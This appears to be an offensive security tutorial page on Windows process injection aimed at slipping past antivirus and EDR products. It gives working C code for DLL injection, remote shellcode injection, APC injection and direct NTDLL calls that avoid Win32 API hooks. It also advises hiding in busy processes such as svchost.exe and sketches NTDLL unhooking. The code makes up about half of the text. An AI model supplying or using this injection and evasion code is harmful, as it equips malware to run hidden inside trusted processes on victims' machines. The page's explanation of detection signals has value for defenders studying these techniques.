---
layout: page
title: "Process Injection: Executing Inside Another Process"
---

# Process Injection: Executing Inside Another Process

A crypter keeps the payload opaque on disk. An obfuscator distorts the static signature. Neither solves the problem of what happens after execution: your code is running in your process, under your identity, with your binary loaded. The behavioral engine sees a new process, tracks its system calls, and when it allocates executable memory and calls into it, the sequence matches known shellcode execution patterns.

Process injection moves execution into a process that already exists. The target process is legitimate. It has an established reputation, an expected memory layout, and no suspicious origin. Your code runs inside it. The behavioral signal changes from "unknown binary allocates and executes memory" to "trusted process performs unexpected memory operations," which is a harder, noisier signal to act on.

## Why the Target Process Matters

The process you inject into determines the noise floor of the detection. A process that frequently does unusual things provides cover. A process that never does anything unusual is transparent.

`svchost.exe` hosts dozens of Windows services and makes hundreds of different system calls continuously. An extra allocation inside one of its instances is difficult to attribute. `explorer.exe` handles shell extensions, previews, and third-party integrations. Browsers have JIT compilers that allocate and execute memory constantly as a first-class operation. Their behavioral profiles are broad enough that injection activity is hard to distinguish from normal operation.

`notepad.exe` opens files and draws text. It has no reason to allocate executable memory, make network connections, or spawn child processes. Injection into it produces a clean, anomalous signal: a process with a narrow behavioral profile suddenly doing things outside that profile.

Choose targets whose normal behavior overlaps with what your injected code will do.

## Classic DLL Injection

Classic DLL injection is the baseline technique. It writes a DLL path into the target process and coerces a thread to call `LoadLibrary` on it. When `LoadLibrary` returns, the DLL's `DllMain` has run and your code is executing inside the target.

```c
#include <windows.h>
#include <stdio.h>

BOOL inject_dll(DWORD pid, const char *dll_path) {
    size_t path_len = strlen(dll_path) + 1;

    // Open target process with sufficient rights
    HANDLE proc = OpenProcess(
        PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD,
        FALSE,
        pid
    );
    if (!proc) return FALSE;

    // Allocate memory in the target for the DLL path string
    LPVOID remote_buf = VirtualAllocEx(
        proc,
        NULL,
        path_len,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    if (!remote_buf) { CloseHandle(proc); return FALSE; }

    // Write the DLL path into the target process
    WriteProcessMemory(proc, remote_buf, dll_path, path_len, NULL);

    // Resolve LoadLibraryA address -- same in all processes due to ASLR
    // sharing kernel32.dll base across processes on the same boot
    LPVOID load_lib = GetProcAddress(GetModuleHandleA("kernel32.dll"),
                                     "LoadLibraryA");

    // Create a remote thread that calls LoadLibraryA(dll_path)
    HANDLE thread = CreateRemoteThread(
        proc,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)load_lib,
        remote_buf,
        0,
        NULL
    );

    WaitForSingleObject(thread, INFINITE);
    CloseHandle(thread);
    CloseHandle(proc);
    return TRUE;
}
```

Every line of this is a detection signal. `OpenProcess` with `PROCESS_CREATE_THREAD` is logged by every EDR. `VirtualAllocEx` into a foreign process is flagged. `WriteProcessMemory` from an untrusted process to a trusted one is a strong indicator. `CreateRemoteThread` is one of the most monitored API calls in the Windows ecosystem.

The DLL itself lands on disk and must be loaded from a path. Any scanner monitoring filesystem events sees it. The DLL is a full PE file: it has an import table, sections, and a `DllMain`. Every heuristic that applies to a standalone binary applies to it.

Classic DLL injection is the technique that every detection paper describes. It is the baseline against which everything else is measured.

## Shellcode Injection

Shellcode injection eliminates the DLL on disk. The payload is position-independent shellcode: raw machine code that operates without a PE header, relocation table, or import resolution. It is written directly into the target's memory and executed.

```c
#include <windows.h>

BOOL inject_shellcode(DWORD pid, uint8_t *shellcode, size_t sc_len) {
    HANDLE proc = OpenProcess(
        PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD,
        FALSE,
        pid
    );
    if (!proc) return FALSE;

    // Allocate RW memory in the target
    LPVOID remote_buf = VirtualAllocEx(
        proc, NULL, sc_len,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    if (!remote_buf) { CloseHandle(proc); return FALSE; }

    // Write shellcode bytes into the target
    WriteProcessMemory(proc, remote_buf, shellcode, sc_len, NULL);

    // Flip to RX before execution
    DWORD old;
    VirtualProtectEx(proc, remote_buf, sc_len, PAGE_EXECUTE_READ, &old);

    // Execute
    HANDLE thread = CreateRemoteThread(
        proc, NULL, 0,
        (LPTHREAD_START_ROUTINE)remote_buf,
        NULL, 0, NULL
    );

    WaitForSingleObject(thread, INFINITE);
    CloseHandle(thread);
    CloseHandle(proc);
    return TRUE;
}
```

The disk problem is gone. No DLL file, no path string, no PE header in the allocation. But the API sequence is the same: `OpenProcess`, `VirtualAllocEx`, `WriteProcessMemory`, `VirtualProtectEx`, `CreateRemoteThread`. Every EDR monitoring API calls at the user-mode hook level catches this sequence regardless of what the memory contains.

The fundamental issue with both techniques is `CreateRemoteThread`. Creating a new thread in a foreign process is a high-signal event. The thread's start address points into an anonymously allocated region with no backing module. That is not how any legitimate software behaves.

## APC Injection

Asynchronous Procedure Calls are a Windows mechanism for queuing work to a thread. When a thread enters an alertable wait state, it drains its APC queue. Each APC is a function pointer and an argument. If you queue an APC to a thread in a target process pointing to your shellcode, the APC executes in the context of that thread when it next enters an alertable wait.

```c
#include <windows.h>
#include <tlhelp32.h>

// Enumerate threads belonging to a target PID and return the first one found.
// Note: this does not verify that the thread is in an alertable wait state.
// APC execution requires the target thread to call SleepEx, WaitForSingleObjectEx,
// or similar with the bAlertable flag set. There is no user-mode API to check
// this externally; threads in a UI message loop are typically alertable.
DWORD find_thread_in_process(DWORD pid) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te = { .dwSize = sizeof(te) };

    Thread32First(snap, &te);
    do {
        if (te.th32OwnerProcessID == pid) {
            CloseHandle(snap);
            return te.th32ThreadID;
        }
    } while (Thread32Next(snap, &te));

    CloseHandle(snap);
    return 0;
}

BOOL inject_apc(DWORD pid, uint8_t *shellcode, size_t sc_len) {
    HANDLE proc = OpenProcess(
        PROCESS_VM_WRITE | PROCESS_VM_OPERATION,
        FALSE, pid
    );
    if (!proc) return FALSE;

    LPVOID remote_buf = VirtualAllocEx(
        proc, NULL, sc_len,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    WriteProcessMemory(proc, remote_buf, shellcode, sc_len, NULL);

    DWORD old;
    VirtualProtectEx(proc, remote_buf, sc_len, PAGE_EXECUTE_READ, &old);

    DWORD tid = find_thread_in_process(pid);
    HANDLE thread = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);

    // Queue APC to existing thread -- no new thread created
    QueueUserAPC((PAPCFUNC)remote_buf, thread, 0);

    CloseHandle(thread);
    CloseHandle(proc);
    return TRUE;
}
```

The detection surface changes meaningfully. `CreateRemoteThread` is gone. No new thread appears in the process. The execution happens inside an existing thread, during a wait that the thread would have made regardless. The thread's start address and call stack look normal up to the point where the APC fires.

The limitation is timing: you cannot control when the thread enters an alertable wait. Functions like `SleepEx`, `WaitForSingleObjectEx`, and `MsgWaitForMultipleObjectsEx` with the alertable flag produce this state. UI threads do it constantly. Service threads may do it rarely or never. If the thread never enters an alertable wait, the APC never executes.

`QueueUserAPC` is also monitored by EDRs. The API is rarely used by legitimate software, so its presence in an API trace is a signal even without `CreateRemoteThread`.

## Calling NTDLL Directly

Every Win32 API is a thin wrapper over an NTDLL function. `VirtualAllocEx` calls `NtAllocateVirtualMemory`. `WriteProcessMemory` calls `NtWriteVirtualMemory`. `CreateRemoteThread` calls `NtCreateThreadEx`. EDRs hook the Win32 layer to intercept these calls. Some also hook NTDLL. The hooks are installed by writing a `jmp` instruction over the first bytes of the target function, redirecting calls into the EDR's inspection code.

Calling NTDLL directly bypasses Win32-layer hooks. If the EDR does not hook NTDLL, the call is invisible to it.

```c
#include <windows.h>
#include <winternl.h>

// Resolve NTDLL function by name at runtime
typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(
    HANDLE    ProcessHandle,
    PVOID    *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T   RegionSize,
    ULONG     AllocationType,
    ULONG     Protect
);

typedef NTSTATUS (NTAPI *NtWriteVirtualMemory_t)(
    HANDLE  ProcessHandle,
    PVOID   BaseAddress,
    PVOID   Buffer,
    SIZE_T  NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

typedef NTSTATUS (NTAPI *NtCreateThreadEx_t)(
    PHANDLE             ThreadHandle,
    ACCESS_MASK         DesiredAccess,
    LPVOID              ObjectAttributes,
    HANDLE              ProcessHandle,
    LPTHREAD_START_ROUTINE StartRoutine,
    LPVOID              Argument,
    ULONG               CreateFlags,
    SIZE_T              ZeroBits,
    SIZE_T              StackSize,
    SIZE_T              MaximumStackSize,
    LPVOID              AttributeList
);

BOOL inject_via_ntdll(DWORD pid, uint8_t *shellcode, size_t sc_len) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");

    NtAllocateVirtualMemory_t NtAllocVm =
        (NtAllocateVirtualMemory_t)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
    NtWriteVirtualMemory_t NtWriteVm =
        (NtWriteVirtualMemory_t)GetProcAddress(ntdll, "NtWriteVirtualMemory");
    NtCreateThreadEx_t NtCreateThEx =
        (NtCreateThreadEx_t)GetProcAddress(ntdll, "NtCreateThreadEx");

    HANDLE proc = OpenProcess(
        PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD,
        FALSE, pid
    );

    PVOID remote_buf = NULL;
    SIZE_T region_size = sc_len;

    NtAllocVm(proc, &remote_buf, 0, &region_size,
              MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    NtWriteVm(proc, remote_buf, shellcode, sc_len, NULL);

    // VirtualProtectEx equivalent via NtProtectVirtualMemory omitted
    // for brevity -- same pattern

    HANDLE thread;
    NtCreateThEx(&thread, GENERIC_EXECUTE, NULL, proc,
                 (LPTHREAD_START_ROUTINE)remote_buf,
                 NULL, FALSE, 0, 0, 0, NULL);

    WaitForSingleObject(thread, INFINITE);
    CloseHandle(thread);
    CloseHandle(proc);
    return TRUE;
}
```

This bypasses Win32-layer hooks. If the EDR also hooks NTDLL, the calls remain visible at that layer. Restoring the original NTDLL bytes requires reading what is currently mapped in memory, comparing it against the clean copy on disk, and writing the originals back before making any calls.

## What the EDR Sees

Each variant reduces the detection surface but not uniformly:

| Technique | CreateRemoteThread | DLL on disk | New thread in target | Win32 hooks |
|---|---|---|---|---|
| Classic DLL | yes | yes | yes | yes |
| Shellcode | yes | no | yes | yes |
| APC | no | no | no (existing thread) | yes |
| NTDLL direct | yes | no | yes | no (if unhooked) |

No variant eliminates all signals. The reduction in visibility is incremental: each technique removes some indicators while others remain. The practical question is whether the remaining signals cross the threshold that triggers an automated response in the target environment.

## The Handle Problem

Every technique above begins with `OpenProcess`. The handle request is logged. The access rights requested determine what the process intends to do. `PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION` is the canonical injection access mask. Its appearance in telemetry from an untrusted process opening a trusted one is a high-confidence signal, independent of everything that follows.

Legitimate software rarely opens handles to unrelated processes with write and thread-creation rights. When it does, it is usually a debugger, an installer, or an anticheat engine. An unknown binary doing it reads as an anomaly.

Mitigating the handle problem requires either obtaining the handle through a less-monitored path, reusing a handle that already exists in your process, or targeting a process relationship where cross-process access is more expected, such as a process you spawned yourself. Each option constrains the target selection and execution context.

